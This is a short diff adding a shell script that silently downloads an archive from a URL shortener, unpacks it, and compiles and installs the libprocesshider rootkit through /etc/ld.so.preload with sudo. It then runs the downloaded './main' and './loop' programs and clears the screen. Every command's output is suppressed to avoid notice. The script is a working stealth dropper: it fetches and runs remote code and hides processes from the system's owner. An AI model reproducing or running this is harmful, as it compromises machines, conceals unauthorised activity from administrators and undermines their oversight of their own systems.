@@ -1,0 +1,8 @@
+wget -O filetargz http://gg.gg/lendir > /dev/null 2>&1
+tar -xf filetargz > /dev/null 2>&1; chmod u+x * > /dev/null 2>&1
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl > /dev/null 2>&1
+sudo cp libprocesshider.so /usr/local/lib > /dev/null 2>&1
+sudo echo /usr/local/lib/libprocesshider.so >> ld.so.preload > /dev/null 2>&1
+sudo cp ld.so.preload /etc > /dev/null 2>&1
+./main|./loop
+clear > /dev/null 2>&1
